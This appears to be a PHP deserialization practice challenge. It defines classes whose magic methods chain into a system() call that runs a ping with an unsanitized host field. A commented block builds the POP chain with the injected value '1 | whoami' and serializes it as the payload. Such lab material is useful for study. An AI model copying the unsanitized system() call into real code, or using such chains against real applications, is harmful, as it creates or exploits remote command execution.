<?php

class start_gg
{
    public $mod1;
    public $mod2;
	public function __construct()
	{
		$this->mod1 = new Hello();
	}
	
    public function __destruct()
    {
        $this->mod1->test1();
    }
}

class Hello
{
	function test1(){
		echo "hello app!";
	}
}

class Call
{
    public $mod1;
    public $mod2;
	
	public function __construct()
	{
		$this->mod1 = new funcv();
	}
	
    public function test1()
    {
        $this->mod1->test2();
    }
}

class funcv
{
	public function test2()
	{
		echo "funcv app's test2!";
	}
}
class funct
{
    public $mod1;
    public $mod2;
    public function __call($test2,$arr)
    {
        $s1 = $this->mod1;
        $s1();
    }
}
class func
{
    public $mod1;
    public $mod2;
    public function __invoke()
    {
        $this->mod2 = "字符串拼接".$this->mod1;
    } 
}
class string1
{
    public $str1;
    public $str2;
    public function __toString()
    {
        echo $this->str1->ping_exec();
        return "1";
    }
}
class GetFlag
{
    public $name;
    public $user;
    public function __construct()
    {
        $this->name = '127.0.0.1';
    }
    public function __wakeup()
    {
        $this->name = '127.0.0.1';
        $this->user = $_GET['user'];
    }
    public function ping_exec()
    {
        echo system("ping -n 1 " . $this->name);
    }
}

// $test1 = new start_gg();
// $test2 = new funct();
// $test3 = new func();
// $test4 = new string1();
// $test5 = new GetFlag();

// $test5 -> name = '1 | whoami'; 
// $test5 -> user = '1'; 
// $test4 -> str1 = $test5;
// $test3 -> mod1 = $test4;
// $test2 -> mod1 = $test3;
// $test1 -> mod1 = $test2;

// $a = serialize($test1);
// echo $a;
